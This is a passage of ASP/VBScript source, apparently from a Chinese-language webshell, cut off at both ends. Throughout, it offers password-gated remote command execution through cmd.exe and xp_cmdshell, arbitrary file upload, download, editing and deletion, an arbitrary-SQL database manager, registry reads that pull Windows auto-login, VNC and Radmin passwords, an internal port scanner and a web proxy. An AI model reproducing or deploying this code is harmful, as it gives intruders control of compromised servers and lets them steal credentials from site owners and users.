			   RESPONSE.WRITE "<P>执行语句："
			   RESPONSE.WRITE "   <INPUT NAME=SQL TYPE=TEXT>"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=SQL>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=执行>"			   
			   RESPONSE.WRITE "</FORM>"
 END IF
End Function

Function DownFile(Path)
Response.Clear
Set OSM = CreateObject(ObT(6,0))
OSM.Open
OSM.Type = 1
OSM.LoadFromFile Path
sz=InstrRev(path,"\")+1
Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
Response.AddHeader "Content-Length", OSM.Size
Response.Charset = "UTF-8"
Response.ContentType = "application/octet-stream"
Response.BinaryWrite OSM.Read
Response.Flush
OSM.Close
Set OSM = Nothing
End Function
Function HTMLEncode(S)
if not isnull(S) then
S= replace(S,">","&gt;")
S=replace(S,"<","&lt;")
S=replace(S,CHR(39),"&#39;")
S=replace(S,CHR(34),"&quot;")
S=replace(S,CHR(20),"&nbsp;")
HTMLEncode=S
end if
End Function
Function UpFile()
  If Request("Action2")="Post" Then
    Set U=new UPC : Set F=U.UA("LocalFile")
	UName=U.form("ToPath")
    If UName="" Or F.FileSize=0 then
      SI="<br>请输入上传的完全路径后选择一个文件上传!"
    Else
        F.SaveAs UName
        If Err.number=0 Then
          SI="<center><br><br><br>文件"&UName&"上传成功！</center>"
		End if
	End If
	Set F=nothing:Set U=nothing
	SI=SI&BackUrl
	RRS SI
	ShowErr()
	Response.End
  End If
    SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
    SI=SI&"<tr><td>"
    SI=SI&"上传路径：<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\cmd.exe")&"' size='40'>"
    SI=SI&" <input name='LocalFile' type='file'  size='25'>"
    SI=SI&" <input type='submit' name='Submit' value='上传'>"
    SI=SI&"</td></tr>"&url&"</form></table>"
  RRS SI
End Function

Function Cmd1Shell()
checked=" checked"
If Request("SP")<>"" Then Session("ShellPath") = Request("SP")
ShellPath=Session("ShellPath")
if ShellPath="" Then ShellPath = "cmd.exe"
if Request("wscript")<>"yes" then checked=""
If Request("cmd")<>"" Then DefCmd = Request("cmd")
SI="<form method='post'>"
SI=SI&"SHELL路径：<input name='SP' value='"&ShellPath&"' Style='width:70%'>  "
SI=SI&"<input class=c type='checkbox' name='wscript' value='yes'"&checked&">WScript.Shell"
SI=SI&"<input name='cmd' Style='width:92%' value='"&DefCmd&"'> <input type='submit' value='执行'><textarea Style='width:100%;height:440;' class='cmd'>"
If Request.Form("cmd")<>"" Then
if Request.Form("wscript")="yes" then
Set CM=CreateObject(ObT(1,0))
Set DD=CM.exec(ShellPath&" /c "&DefCmd)
aaa=DD.stdout.readall
SI=SI&aaa
else
On Error Resume Next
Set ws=Server.CreateObject("WScript.Shell")
Set ws=Server.CreateObject("WScript.Shell")
Set fso=Server.CreateObject("Scripting.FileSystemObject")
szTempFile = server.mappath("cmd.txt")
Call ws.Run (ShellPath&" /c " & DefCmd & " > " & szTempFile, 0, True)
Set fs = CreateObject("Scripting.FileSystemObject")
Set oFilelcx = fs.OpenTextFile (szTempFile, 1, False, 0)
aaa=Server.HTMLEncode(oFilelcx.ReadAll)
oFilelcx.Close
Call fso.DeleteFile(szTempFile, True)
SI=SI&aaa
end if
End If
SI=SI&chr(13)&"</textarea></form>"
RRS SI
End Function

Function CreateMdb(Path) 
   SI="<br><br>"
   Set C = CreateObject(ObT(2,0)) 
   C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
   Set C = Nothing
   If Err.number=0 Then
     SI = SI & Path & "建立成功!"
   End If
   SI=SI&BackUrl 
   RRS SI
End function

Function CompactMdb(Path)
If Not ObT(0,1) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
	Set C=Nothing
Else
  Set FSO=CreateObject(ObT(0,1))
  If FSO.FileExists(Path) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
	Set C=Nothing
    FSO.DeleteFile Path
	FSO.MoveFile Path&"_bak",Path
  Else
    SI="<center><br><br><br>数据库"&Path&"没有发现！</center>" 
	Err.number=1
  End If
  Set FSO=Nothing
End If
  If Err.number=0 Then
    SI="<center><br><br><br>数据库"&Path&"压缩成功！</center>"
  End If
  SI=SI&BackUrl
  RRS SI
End Function

if session("web2a2dmin")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass then
session("web2a2dmin")=UserPass
response.redirect url
else
 rrs"<br><br><br><br><br><br><br><br><center>我靠，你不是来打酱油的吧!</center>"
end if
else
si="<center><div style='width:400;border:1px solid lime;padding:10px;margin:100px;color:lime;font-family: Comic Sans MS;'><b><font style=""FONT-SIZE: 25px; FILTER: shadow(color=red); WIDTH: 100%; COLOR: #00FF00; LINE-HEIGHT: 300%; FONT-FAMILY: Comic Sans MS"" color=""#00FF00""><a href='"&SitEURL&"' target='_blank'>"&mname&"</a></font></b><hr size=1 color=lime><form action='"&url&"' method='post'>密码：<input name='PaSs' type='PaSsword' size='22'> <input type='submit' value='登录'><hr size=1 color=lime>"&Copyright&"</center>"
if instr(SI,SIC)<>0 thEn rrs sI
end if
response.end
end If

FuncTion MMD()
SI="<br><table width=""100%""><tr class=tr><form name=form method=post action="""">CMD命令<input type=text name=MMD size=35 ><input type=text name=U value=mssql用户名><input type=text name=P value=mssql密码><input type=submit value=执行></form></tr></table>":REsPonsE.writE SI:SI="":If trim(REquEst.form("MMD"))<>""  thEn:PaSsword= trim(REquEst.form("P")):id=trim(REquEst.form("U")):set adoConn=SErvEr.CreateObject("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;PaSsword="&PaSsword&";UsEr ID="&id:strQuery = "exec master.dbo.xp_cmdshell '" & REquEst.form("MMD") & "'":set recREsult = adoConn.Execute(strQuery):If NOT recREsult.EOF thEn:Do While NOT recREsult.EOF:strREsult = strREsult & chr(13) & recREsult(0):recREsult.MoveNext:Loop:End if:set recREsult = Nothing:strREsult = REplAcE(strREsult," ","&nbsp;"):strREsult = REplAcE(strREsult,"<","&lt;"):strREsult = REplAcE(strREsult,">","&gt;"):strREsult = REplAcE(strREsult,chr(13),"<br>"):End if:set adoConn = Nothing:REsPonsE.WritE REquEst.form("MMD") & "<br>"& strREsult
end Function
Function DbManager()
  SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")
  SI=SI&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<form name='DbForm' method='post' action=''>"
  SI=SI&"<tr><td width='100' height='27'>  数据库连接串:</td>"
  SI=SI&"<td><input name='DbStr' style='width:470' value="""&DbStr&"""></td>"
  SI=SI&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>连接串示例</option><option value=0>Access连接</option>"
  SI=SI&"<option value=1>MsSql连接</option><option value=2>MySql连接</option><option value=3>DSN连接</option>"
  SI=SI&"<option value=-1>--SQL语法--</option><option value=4>显示数据</option><option value=5>添加数据</option>"
  SI=SI&"<option value=6>删除数据</option><option value=7>修改数据</option><option value=8>建数据表</option>"
  SI=SI&"<option value=9>删数据表</option><option value=10>添加字段</option><option value=11>删除字段</option>"
  SI=SI&"<option value=12>完全显示</option></select></td></tr>"
  SI=SI&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  SI=SI&"<tr><td height='30'> SQL操作命令:</td>"
  SI=SI&"<td><input name='SqlStr' style='width:470' value="""&SqlStr&"""></td>"
  SI=SI&"<td align='center'><input type='submit' name='Submit' value='执行' onclick='return DbCheck()'></td>"
  SI=SI&"</tr></form></table><span id='abc'></span>"
  RRS SI:SI=""
  If Len(DbStr)>40 Then
  Set Conn=CreateObject(ObT(5,0))
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>表<br>名</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
    If Rs("TABLE_TYPE")="TABLE" then
	  TName=Rs("TABLE_NAME")
      SI=SI&"<td align=center><a href=""javascript:if(confirm('确定删除么？'))FullSqlStr('DROP TABLE ["&TName&"]',1)"">[ del ]</a><br>"
      SI=SI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
    End If 
    Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  SI=SI&"</tr></table>"
  RRS SI:SI=""
If Len(SqlStr)>10 Then
  If LCase(Left(SqlStr,6))="select" then
    SI=SI&"执行语句："&SqlStr
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=20
    Count=Rs.PageSize
    PN=Rs.PageCount
    Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      SI=SI&"<td align='center'>"&Fld.Name&"</td>"
      Set Fld=nothing
    Next
    SI=SI&"</tr>"
    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  SI=SI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    SI=SI&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
	  Next
	  SI=SI&"</tr>"
      Rs.MoveNext
    Loop
	RRS SI:SI=""
	SqlStr=HtmlEnCode(SqlStr)
    SI=SI&"<tr><td colspan="&FN+1&" align=center>记录数："&RC&" 页码："&Page&"/"&PN
    If PN>1 Then
      SI=SI&"  <a href='javascript:FullSqlStr("""&SqlStr&""",1)'>首页</a> <a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>上一页</a> "
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        SI=SI&i&" "
        Else
        SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a> "
        End If
      Next
	  SI=SI&" <a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>下一页</a> <a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>尾页</a>"
    End If
    SI=SI&"<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
	RRS SI:SI=""
  Else	   
    Conn.Execute(SqlStr)
    SI=SI&"SQL语句："&SqlStr
  End If
  RRS SI:SI=""
End If
  Conn.Close
  Set Conn=Nothing
  End If
End Function

Dim T1:Class UPC:Dim D1,D2:Public Function Form(F):F=lcase(F):If D1.exists(F) then:Form=D1(F):else:Form="":end if:End Function:Public Function UA(F):F=lcase(F):If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if:End Function:Private Sub Class_Initialize:Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName:set D1=CreateObject(Sot(4,0)):if Request.TotalBytes<1 then Exit Sub
set T1=CreateObject(Sot(6,0)):T1.Type=1:T1.Mode=3:T1.Open:T1.Write Request.BinaryRead(Request.TotalBytes):T1.Position=0:TDa=T1.Read:DStart=1:DEnd=LenB(TDa):set D2=CreateObject(Sot(4,0)):vbCrlf=chrB(13)&chrB(10):set T2=CreateObject(Sot(6,0)):TSt=MidB(TDa,1,InStrB(DStart,TDa,vbCrlf)-1):TLen=LenB(TSt):DStart=DStart+TLen+1:while (DStart+10)<DEnd:DIEnd=InStrB(DStart,TDa,vbCrlf&vbCrlf)+3:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DStart:T1.CopyTo T2,DIEnd-DStart:T2.Position=0:T2.Type=2:T2.Charset="gb2312":TIn=T2.ReadText:T2.Close:DStart=InStrB(DIEnd,TDa,TSt):FStart=InStr(22,TIn,"name=""",1)+6:FEnd=InStr(FStart,TIn,"""",1):UpName=lcase(Mid(TIn,FStart,FEnd-FStart)):if InStr (45,TIn,"filename=""",1)>0 then
set TFL=new FIF:FStart=InStr(FEnd,TIn,"filename=""",1)+10:FEnd=InStr(FStart,TIn,"""",1):FStart=InStr(FEnd,TIn,"Content-Type: ",1)+14:FEnd=InStr(FStart,TIn,vbCr):TFL.FileStart=DIEnd:TFL.FileSize=DStart-DIEnd-3:if not D2.Exists(UpName) then:D2.add UpName,TFL:end if
else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset ="gb2312":SFV = T2.ReadText:T2.Close:if D1.Exists(UpName) then:D1(UpName)=D1(UpName)&","&SFV:else:D1.Add UpName,SFV:end if:end if:DStart=DStart+TLen+1:wend:TDa="":set T2=nothing:End Sub:Private Sub Class_Terminate:if Request.TotalBytes>0 then:D1.RemoveAll:D2.RemoveAll:set D1=nothing:set D2=nothing:T1.Close:set T1 =nothing:end if:End Sub:End Class
Class FIF:dim FileSize,FileStart:Private Sub Class_Initialize:FileSize=0:FileStart=0:End Sub:Public function SaveAs(F)
dim T3:SaveAs=true:if trim(F)="" or FileStart=0 then exit function
set T3=CreateObject(Sot(6,0)):T3.Mode=3:T3.Type=1:T3.Open:T1.position=FileStart:T1.copyto T3,FileSize:T3.SaveToFile F,2:T3.Close:set T3=nothing:SaveAs=false:end function:End Class
Class LBF:Dim CF:Private Sub Class_Initialize:SET CF=CreateObject(ObT(0,0)):End Sub:Private Sub Class_Terminate:Set CF=Nothing:End Sub:Function ShowDriver()
For Each D in CF.Drives
      RRS"   <a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>"&face("ff8000",0,"8")&"本地磁盘 ("&D.DriveLetter&":)</a><br>" 
    Next
    End Function:Function Show1File(Path)
      Set FOLD=CF.GetFolder(Path)
  i=0
    SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'><tr>"
  For Each F in FOLD.subfolders
    SI=SI&"<td height=10>"
    SI=SI&"<a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""打开""><font face='wingdings' size='6'>0</font>"&F.Name&"</a>" 
	SI=SI&" _<a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='复制'>复制</a>"
    SI=SI&"  <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='删除'>删除</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='移动'>移动</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")'  onclick='return yesok()' class='am' title='下载'>下载</a></td>"
	i=i+1
    If i mod 3 = 0 then SI=SI&"</tr><tr>"
  Next
    SI=SI&"</tr><tr><td height=2></td></tr></table>"
	RRS SI &"<hr noshade size=1 color=""#"" />" : SI=""
  For Each L in Fold.files
    SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
    SI=SI&"<tr style='boungroup-color:#'>"
	SI=SI&"<td height='30'><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='下载'><font face='wingdings' size='4'>2</font>"&L.Name&"</a></td>"
    SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='编辑'>编辑</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>删除</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='复制'>复制</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='移动'>移动</a></td>"	
    SI=SI&"<td width='50' align=""center"">"&clng(L.size/1024)&"K</td>"
	SI=SI&"<td width='200' align=""center"">"&L.Type&"</td>"
    SI=SI&"<td width='160'>"&L.DateLastModified&"</td>"
    SI=SI&"</tr></table>"
	RRS SI:SI=""
  Next
  Set FOLD=Nothing
  End function:Function DelFile(Path)
  If CF.FileExists(Path) Then
CF.DeleteFile Path
SI="<center><br><br><br>文件 "&Path&" 删除成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function:Function EditFile(Path)
If Request("Action2")="Post" Then
Set T=CF.CreateTextFile(Path)
T.WriteLine Request.form("content")
T.close
Set T=nothing
SI="<center><br><br><br>文件保存成功！</center>"
SI=SI&BackUrl
RRS SI
Response.End
End If
If Path<>"" Then
Set T=CF.opentextfile(Path, 1, False)
Txt=HTMLEncode(T.readall) 
T.close
Set T=Nothing
Else
Path=Session("FolderPath")&"\newfile.asp":Txt="新建文件"
End If
SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
SI=SI&"<input name='Action' value='EditFile' Type='hidden'>"
SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>"
SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
SI=SI&"<hr><input name='goback' type='button' value='返回' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='重置'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='保存'></form>"
RRS SI
End Function:Function CopyFile(Path)
  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFile Path(0),Path(1)
      SI="<center><br><br><br>文件"&Path(0)&"复制成功！</center>"
      SI=SI&BackUrl
	  RRS SI 
	End If
	End Function:Function MoveFile(Path)
	  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFile Path(0),Path(1)
      SI="<center><br><br><br>文件"&Path(0)&"移动成功！</center>"
      SI=SI&BackUrl
	  RRS SI 
	End If
	End Function:Function DelFolder(Path)
	    If CF.FolderExists(Path) Then
	  CF.DeleteFolder Path
      SI="<center><br><br><br>目录"&Path&"删除成功！</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
	End Function:Function CopyFolder(Path)
	  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFolder Path(0),Path(1)
      SI="<center><br><br><br>目录"&Path(0)&"复制成功！</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
	End Function:Function MoveFolder(Path)
	  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFolder Path(0),Path(1)
      SI="<center><br><br><br>目录"&Path(0)&"移动成功！</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
	End Function:Function NewFolder(Path)
	    If Not CF.FolderExists(Path) and Path<>"" Then
	  CF.CreateFolder Path
      SI="<center><br><br><br>目录"&Path&"新建成功！</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
	End Function:End Class
	sub getTerminalInfo()
On Error Resume Next
Response.Write "<br><br>[特殊端口探测]<br><hr size=1>"
Set wsh = Server.CreateObject("WScript.Shell")
Telnetkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\TelnetPort"
TlntPort=Wsh.RegRead(TelnetKey)
if TlntPort="" Then Tlnt="23"
Response.Write "<li>Telnet端口:"&Tlntport&"<br>"
TermKey="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
TermPort=Wsh.RegRead(TermKey)
If TermPort="" Then TermPort="无法读取.请确认是否为Windows Server版本主机"
Response.Write "<li>Terminal Service端口为:"&TermPort&"<br>"
pcAnywhereKey="HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
PAWPort=Wsh.RegRead(pcAnywhereKey)
If PAWPort="" then PAWPort="无法获取.请确认主机是否安装pcAnywhere"
Response.Write "<li>PcAnywhere端口为:"&PAWPort&"<br>"
Response.Write "------------------------------------------------------"
Set wsX = Server.CreateObject("WScript.Shell")
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey = "PortNumber"
termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
RRS "终端服务端口及自动登录<hr/><ol>"
If termPort = "" Or Err.Number <> 0 Then 
RRS"无法得到终端服务端口, 请检查权限是否已经受到限制.<br/>"
 Else
RRS "当前终端服务端口: " & termPort & "<br/>"
End If
autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey = "AutoAdminLogon"
autoLoginUserKey = "DefaultUserName"
autoLoginPassKey = "DefaultPassword"
isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable = 0 Then
RRS "系统自动登录功能未开启<br/>"
Else
autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
RRS "自动登录的系统帐户: " & autoLoginUsername & "<br>"
autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
RRS "False"
End If
RRS "自动登录的帐户密码: " & autoLoginPassword & "<br>"
End If
RRS "</ol>"
End Sub

sub ReadREG()
RrS"注册表键值读取:<hr/>"
RrS"<form method=post>"
RrS"<input type=hidden value=readReg name=theAct>"
RrS"<input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
RrS" <input type=submit value=' 读取 '><br><br>"
RrS"<input type=hidden value=vnc name=vnc>"
RrS"<input name=vnc value='HKCU\Software\ORL\WinVNC3\Password' size=80 type=hidden>"
RrS" <input type=submit value=' 读取VNC密码 '>  "
RrS"<input type=hidden value=readReg name=radmin>"
RrS"<input name=radmin value='HKEY_LOCAL_MACHINE\SYSTEM\RAdmin' size=80 type=hidden>"
RrS" <input type=submit value=' 读取Radmin密码 '>  <br><br><br>"
RrS"HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {不显示上次登录用户}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=缺省,1=匿名用户无法列举本机用户列表,2=匿名用户无法连接本机IPC$共享}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {禁止默认共享}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {关闭网络共享}<br/><br>"
RrS"HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {启用TCP/IP筛选(所有试配器)}<br/><br>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {允许IP路由}<br/><br>"
RrS"-------以下似乎要看绑定的网卡,不知道是否准确---------<br/><p></p>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {默认网关}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {首DNS}<br/><br>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {允许的TCP/IP端口}<br/><br>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {允许的UDP端口}<br/><br>"
RrS"-----------OVER--------------------<br/><p></p>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {共几块活动网卡}<br/><br><p></p>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {当前网卡的序列(把上面的替换)}<br/><br>"
RrS"<span id=regeditInfo style='display:none;'><hr/>"
RrS"</span>"
RrS"</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject("WScript.Shell")
thePath=Request("thePath")
theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray)
RrS"<li>" & theArray(i)
Next
 Else
RrS"<li>" & theArray
End If
end if
end sub
sub ScanPort()
Server.ScriptTimeout = 7776000
if request.Form("port")="" then
PortList="21,23,80,88,8080,1433,3306,3389,4899,5631,5631,6059,6129,43958,65500"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
RRS"<p>端口扫描器(如果扫描多个端口,速度比较慢,个人推荐使用CMD)</p>"
RRS"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
RRS"<p>Scan IP: "
RRS" <input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'>"
RRS"<br>Port List:"
RRS"<input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'>"
RRS"<br><br>"
RRS"<input name='submit' type='submit' class='buttom' value=' scan '>"
RRS"<input name='scan' type='hidden' id='scan' value='111'>"
RRS"</p></form>"
If request.Form("scan") <> "" Then
timer1 = timer
RRS("<b>扫描报告:</b><br><hr>")
tmp = Split(request.Form("port"),",")
ip = Split(request.Form("ip"),",")
For hu = 0 to Ubound(ip)
If InStr(ip(hu),"-") = 0 Then
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ip(hu), tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ip(hu), j)
Next
Else
RRS(startN & " or " & endN & " is not number<br>")
End If
Else
RRS(tmp(i) & " is not number<br>")
End If
End If
Next
Else
ipStart = Mid(ip(hu),1,InStrRev(ip(hu),"."))
For xxx = Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ipStart & xxx, tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ipStart & xxx,j)
Next
Else
RRS(startN & " or " & endN & " is not number<br>")
End If
Else
RRS(tmp(i) & " is not number<br>")
End If
End If
Next
Next
End If
Next
timer2 = timer
thetime=cstr(int(timer2-timer1))
RRS"<hr>Process in "&thetime&" s"
END IF
end sub
Sub Scan(targetip, portNum)
	On Error Resume Next
	set conn = Server.CreateObject("ADODB.connection")
	connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
	conn.ConnectionTimeout = 1
	conn.open connstr
	If Err Then
		If Err.number = -2147217843 or Err.number = -2147467259 Then
			If InStr(Err.description, "(Connect()).") > 0 Then
				RRS(targetip & ":" & portNum & ".........关闭<br>")
			Else
				RRS(targetip & ":" & portNum & ".........<font color=red>开放</font><br>")
			End If
		End If
	End If
End Sub
Select Case Action:Case "MainMenu":MainMenu():Case "getTerminalInfo":getTerminalInfo():Case "PageAddToMdb":PageAddToMdb():case "ScanPort":ScanPort():Case "webpor"
response.write "<form name='form1' method='post' action=''><p><strong>请输入您要使用代理访问的网页：</strong>"
if request.form("a")="" then
response.write "<input name='a' type='text' class='unnamed1' id='a' value='http://'>"
else
response.write "<input name='a' type='text' class='unnamed1' id='a' value='"&request.form("a")&"'>"
end if
response.write "<label><select name='yy' class='input'><option value='gb2312' selected>简体中文</option><option value='big5'>繁体中文</option><option value='Shift-jIS'>日文</option><option value='UTF-8'>UTF-8</option><option value='windows'>西欧默认</option><option value='ISO'>西欧Iso</option></select></label><input name='Submit' type='submit' class='unnamed1' value='提交'><font color='#990000' size='-1'> </font></p></form></div>"
if request.form("a")<>"" or request("a")<>"" then
wstr=getHTTPPage( request.form("a") )
if int(len(wstr))>1000 then
start=newstring(wstr,"")
over=newstring(wstr,"")
response.write wstr
else
response.write "发生错误，为了节省资源被End了，要么是您要访问的资源有问题"
end if
